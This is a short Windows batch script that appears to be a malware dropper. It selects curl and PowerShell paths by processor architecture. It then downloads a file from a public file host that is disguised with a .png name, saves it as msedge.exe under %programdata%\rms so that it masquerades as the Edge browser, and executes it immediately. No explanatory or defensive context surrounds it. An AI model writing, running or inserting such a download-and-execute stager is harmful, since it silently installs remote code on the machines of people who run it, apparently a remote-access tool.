@echo off
if "%processor_architecture%" == "amd64" (
set curl="%windir%\System32\curl.exe"
set powershell="%windir%\System32\WindowsPowerShell\v1.0\powershell.exe"
) else (
set curl="%windir%\SysWOW64\curl.exe"
set powershell="%windir%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
)
%curl% -X GET "https://files.catbox.moe/xj9m2o.png" -o %programdata%\rms\msedge.exe
"%programdata%\rms\msedge.exe"
